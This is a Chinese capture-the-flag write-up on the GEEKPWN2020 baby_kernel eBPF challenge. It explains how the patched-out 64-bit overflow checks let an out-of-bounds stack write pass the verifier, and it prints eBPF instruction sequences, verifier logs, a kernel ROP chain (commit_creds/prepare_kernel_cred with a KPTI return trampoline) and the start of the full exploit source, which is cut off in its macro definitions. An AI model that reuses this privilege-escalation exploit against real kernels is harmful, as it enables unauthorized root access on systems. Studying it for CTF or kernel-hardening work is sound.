# GEEKPWN2020-baby_kernel的另一种解法
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
最近看到网上关于eBPF漏洞的分析接踵而至，应该是之前CVE-2020-27194
漏洞掀起了一波分析热潮，笔者看到网上分析文章的漏洞利用基本都是以ZDI上CVE-2020-8835的利用思路为主，构造任意读写来达到提权的目的，这里笔者以最近的GEEKPWN2020-云安全挑战赛决赛-baby_kernel题目为例，分享一种利用栈溢出的漏洞利用方式，为这波热潮再续温一阵。
## 题目分析
版本信息
    git checkout d82a532a611572d85fd2610ec41b5c9e222931b6
由于笔者并没有题目文件，所以看网上分析，手动打了题目补丁：
    5446 static void scalar_min_max_add(struct bpf_reg_state *dst_reg,
    5447                    struct bpf_reg_state *src_reg)            
    5448 {                                                            
    5449     s64 smin_val = src_reg->smin_value;                      
    5450     s64 smax_val = src_reg->smax_value;                      
    5451     u64 umin_val = src_reg->umin_value;                      
    5452     u64 umax_val = src_reg->umax_value;                      
    5453                                                              
    5454     /*                                                       
    5455     if (signed_add_overflows(dst_reg->smin_value, smin_val) |
    5456         signed_add_overflows(dst_reg->smax_value, smax_val)) 
    5457         dst_reg->smin_value = S64_MIN;                       
    5458         dst_reg->smax_value = S64_MAX;                       
    5459     } else {                                                 
    5460     */                                                       
    5461         dst_reg->smin_value += smin_val;                     
    5462         dst_reg->smax_value += smax_val;                     
    5463     /*}                                                      
    5464     if (dst_reg->umin_value + umin_val umax_value + umax_val umin_value = 0;                             
    5467         dst_reg->umax_value = U64_MAX;                       
    5468     } else {*/                                               
    5469         dst_reg->umin_value += umin_val;                     
    5470         dst_reg->umax_value += umax_val;                     
    5471     //}                                                      
    5472 }
上述补丁去除了64位整数相加的溢出检查。
    5938 static int adjust_scalar_min_max_vals(struct bpf_verifier_env *env,
    5939                       struct bpf_insn *insn,                     
    5940                       struct bpf_reg_state *dst_reg,             
    5941                       struct bpf_reg_state src_reg)              
    5942 {  
        ……
    5976     } else {                                                   
    5977         src_known = tnum_is_const(src_reg.var_off);            
    5978         if ((src_known &&                                      
    5979              (smin_val != smax_val || umin_val != umax_val)) ||
    5980             smin_val > smax_val  /*|| umin_val > umax_val*/ ) {
    5981             /* Taint dst register if offset had invalid bounds 
    5982              * derived from e.g. dead branches.                
    5983              */                                                
    5984             __mark_reg_unknown(env, dst_reg);                  
    5985             return 0;                                          
    5986         }                                                      
    5987     } 
    ……
上述补丁去除了adjust_scalar_min_max_vals函数中64位无符号数 umin_val >
umx_val的检查。两个补丁最主要的就是未检查64位整数相加溢出的情况，所以我们只要构造溢出就可以绕过后续的检查。
绕过检查的逻辑如下：
    BPF_LD_IMM64(BPF_REG_6, 0x8000000000000000),   // r6=0x8000000000000000
    BPF_JMP_REG(BPF_JLE, BPF_REG_5, BPF_REG_6, 1), // r5 >= 33
r5
为从map输入的数，首先通过条件判断约束r5的范围，使其umax_value=0x8000000000000000，而umin_value默认值为0，所以在r5+r5的结果导致r5的范围变为[0,0]，因为0x8000000000000000+0x8000000000000000
溢出为0。但此时var_off.mask为0xffffffff，所以右移33，此时bpf检查程序认为r6是常数0。 而实际运行r5传入值
0x100000000 时， 计算过程如下：
    r5 = 0x100000000
    r5 += r5 -> 0x100000000+0x100000000=0x200000000
    r6 = r5 = 0x200000000
    r6 >>= 33 -> 0x200000000>>33=1
bpf 日志如下：
    12: (18) r6 = 0x8000000000000000
    14: (bd) if r5 >= 33
    19: R0_w=invP1 R5_w=invP(id=0,umax_value=0,var_off=(0x0; 0xffffffff)) R6_w=invP0 R8_w=map_value(id=0,off=0,ks=4,vs=256,imm=0) R9=map_ptr(id=0,off=0,ks=4,vs=256,imm=0) R10=fp0 fp-?
绕过检查的方式很多种，主要方式就是检查时让其认为传入的值通过计算后恒为常数，而实际运行时却可以传入任意数，从而实现绕过后续的检查造成越界读写。
## 漏洞利用
绕过检查后，我们可以在栈上进行越界读写，直接修改返回地址，构造rop关闭各种保护机制后进行提权。比构造任意读写更加方便快捷，同时内核结构体的随机化也没有影响，只是利用的rop链会有所不同。
栈溢出利用如下：
    BPF_MOV64_REG(BPF_REG_7,BPF_REG_10), // 对栈指针进行越界读写
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_7, -0x38),  // 开辟栈空间，-0x38 
    BPF_ALU64_IMM(BPF_MUL, BPF_REG_6, 0x20),  // r6 -> arb num， r6的值不能超过0x38，所以相加了两次进行溢出
    BPF_ALU64_REG(BPF_ADD,BPF_REG_7, BPF_REG_6), //rop[0]
    BPF_ALU64_REG(BPF_ADD,BPF_REG_7, BPF_REG_6), 
    BPF_LDX_MEM(BPF_DW,BPF_REG_0,BPF_REG_8, 0x18), // map[3]
    BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_0, 0),
r10保存着rsp指针，不能直接对r10操作，所以赋值给r7，开辟0x38的栈空间后，r7=rsp-0x38，此时由于r6的值不能超过0x38，所以相加了两次进行溢出，最终r7=rsp-0x38+0x20+0x20=rsp+0x8，rsp+0x8保存在返回地址，将其覆盖就可以执行rop链了。
在笔者的环境下找到的rop链如下：
    pop_rdi_ret;            //rop[0]  pop rdi; ret;
    0;                      //rop[1]
    prepare_kernel;         //rop[2]
    xchg_rax_rdi;           //rop[3]  xchg rax, rdi; dec dword ptr [rax - 0x77]; 
    commit_creds;           //rop[4]
    kpti_ret;               //rop[5]  swapgs_restore_regs_and_return_to_usermode
    0;                      //rop[6]
    0;                      //rop[7]
    &get_shell;             //rop[8]
    user_cs;                //rop[9]
    user_rflags;            //rop[10]
    user_sp;                //rop[11]
    user_ss;                //rop[12]
首先执行 commit_creds(prepare_kernel_cred(0));
然后调用swapgs_restore_regs_and_return_to_usermode 来关闭KPTI保护。
KPTI(Kernel PageTable
Isolation)全称为内核页表隔离，它通过完全分离用户空间与内核空间页表来解决之前CPU漏洞，防止通过侧信道攻击泄露信息。
KPTI中每个进程有两套页表——内核态页表与用户态页表(两个地址空间)。内核态页表只能在内核态下访问，可以创建到内核和用户的映射（不过用户空间受SMAP和SMEP保护）。用户态页表只包含用户空间。不过由于涉及到上下文切换，所以在用户态页表中必须包含部分内核地址，用来建立到中断入口和出口的映射。
当中断在用户态发生时，就涉及到切换CR3寄存器，从用户态地址空间切换到内核态的地址空间。中断上半部的要求是尽可能的快，从而切换CR3这个操作也要求尽可能的快。为了达到这个目的，KPTI中将内核空间的PGD和用户空间的PGD连续的放置在一个8KB的内存空间中（内核态在低位，用户态在高位）。这段空间必须是8K对齐的，这样将CR3的切换操作转换为将CR3值的第13位(由低到高)的置位或清零操作，提高了CR3切换的速度。
简单来说CR3的第13位决定着是使用用户态页表还是内核态的页表，要想绕过KPTI机制只需要修改CR3的第13位为1，内核就会从内核PGD转为用户态PGD，所以要找到类似以下的gadget：
    mov     rdi, cr3
    or      rdi, 1000h
    mov     cr3, rdi
而在swapgs_restore_regs_and_return_to_usermode+0x16处可以很方便地用到上述gadget：
    swapgs_restore_regs_and_return_to_usermode
    .text:FFFFFFFF81600A34 41 5F                          pop     r15
    .text:FFFFFFFF81600A36 41 5E                          pop     r14
    .text:FFFFFFFF81600A38 41 5D                          pop     r13
    .text:FFFFFFFF81600A3A 41 5C                          pop     r12
    .text:FFFFFFFF81600A3C 5D                             pop     rbp
    .text:FFFFFFFF81600A3D 5B                             pop     rbx
    .text:FFFFFFFF81600A3E 41 5B                          pop     r11
    .text:FFFFFFFF81600A40 41 5A                          pop     r10
    .text:FFFFFFFF81600A42 41 59                          pop     r9
    .text:FFFFFFFF81600A44 41 58                          pop     r8
    .text:FFFFFFFF81600A46 58                             pop     rax
    .text:FFFFFFFF81600A47 59                             pop     rcx
    .text:FFFFFFFF81600A48 5A                             pop     rdx
    .text:FFFFFFFF81600A49 5E                             pop     rsi
    .text:FFFFFFFF81600A4A 48 89 E7                       mov     rdi, rsp    &get_shell，完成提权。
完整利用代码如下：
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include "./bpf.h"
    #define BPF_JMP32 0x06
    #define BPF_JLT 0xa0
    #define BPF_OBJ_GET_INFO_BY_FD 15
    #define BPF_MAP_TYPE_STACK 0x17
    #define BPF_ALU64_IMM(OP, DST, IMM)                \
        ((struct bpf_insn) {                    \
            .code  = BPF_ALU64 | BPF_OP(OP) | BPF_K,    \
            .dst_reg = DST,                    \
            .src_reg = 0,                    \
            .off   = 0,                    \
            .imm   = IMM })
    #define BPF_ALU64_REG(OP, DST, SRC)                \
        ((struct bpf_insn) {                    \
            .code  = BPF_ALU64 | BPF_OP(OP) | BPF_X,    \
            .dst_reg = DST,                    \
            .src_reg = SRC,                    \
            .off   = 0,                    \
            .imm   = 0 })
    #define BPF_ALU32_IMM(OP, DST, IMM)                \
        ((struct bpf_insn) {                    \
            .code  = BPF_ALU | BPF_OP(OP) | BPF_K,        \
            .dst_reg = DST,                    \
            .src_reg = 0,                    \
            .off   = 0,                    \
            .imm   = IMM })
    #define BPF_ALU32_REG(OP, DST, SRC)                \
        ((struct bpf_insn) {                    \
            .code  = BPF_ALU | BPF_OP(OP) | BPF_X,        \
            .dst_reg = DST,                    \